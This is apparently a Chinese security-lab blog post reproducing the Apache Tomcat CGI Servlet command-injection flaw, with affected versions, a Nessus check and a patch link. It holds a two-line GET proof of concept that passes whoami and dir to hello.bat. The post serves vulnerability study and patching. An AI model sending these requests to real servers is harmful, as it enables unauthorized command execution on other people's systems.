> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ry_OgItGsaOYF8Kg0frG0w)

  

网安引领时代，弥天点亮未来 

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00 写在前面**  

  

**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01 漏洞介绍**  

Apache Tomcat 是美国阿帕奇（Apache）基金会的一款轻量级 Web 应用服务器。该程序实现了对 Servlet 和 JavaServer Page（JSP）的支持。

Apache Tomcat 9.0.0.M1 版本至 9.0.17 版本、8.5.0 版本至 8.5.39 版本和 7.0.0 版本至 7.0.93 版本中的 CGI Servlet 存在操作系统命令注入漏洞。远程攻击者可利用该漏洞执行代码。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 影响版本**  

  

Apache Tomcat 9.0.0.M1 版本至 9.0.17 版本

Apache Tomcat 8.5.0 版本至 8.5.39 版本

Apache Tomcat 7.0.0 版本至 7.0.93 版本

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDktg0FWlMQDD7Lhd0Awo9eOpbn7XK6Uhxqfb2G4uOtfe4QSdQ7VBn6nzNBzBF5ibQp6pqMjs45O3w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 漏洞复现**  

  

1. 访问漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDktg0FWlMQDD7Lhd0Awo9elUsulTKav11MbGNIWwOJtSRlsu1hbhwgOjt47J5VUSop0Qkic4gn0aw/640?wx_fmt=png)

2. 对漏洞进行复现

 **POC （GET）**

```
 /cgi-bin/hello.bat?c:/windows/system32/whoami
 /cgi-bin/hello.bat?dir

```

漏洞复现

         GET 请求，响应存在漏洞

        执行 whoami

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDktg0FWlMQDD7Lhd0Awo9ePQHFPOIBDtsZVyOopDclhZfLrkNRgtaZ5gBhGnhAsicFOEovdAscYVA/640?wx_fmt=png)

      执行 dir

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDktg0FWlMQDD7Lhd0Awo9eZ9ZarlRLdWcIDWiaicEtOPM6yEIo7YyORocR8OFXRrT4L1Y3GYwO84SQ/640?wx_fmt=png)

   3.Nessus 测试（漏洞存在）

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDktg0FWlMQDD7Lhd0Awo9ekpLAiaQTMztzc38nZvflRJH88FQsoGHIcZvia6ZQHo1f7zTQsr3gIbFg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 修复建议**  

  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
http://mail-archives.apache.org/mod_mbox/www-announce/201904.mbox/%3C13d878ec-5d49-c348-48d4-25a6c81b9605@apache.org%3E

```

弥天简介

学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。

口号 网安引领时代，弥天点亮未来

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)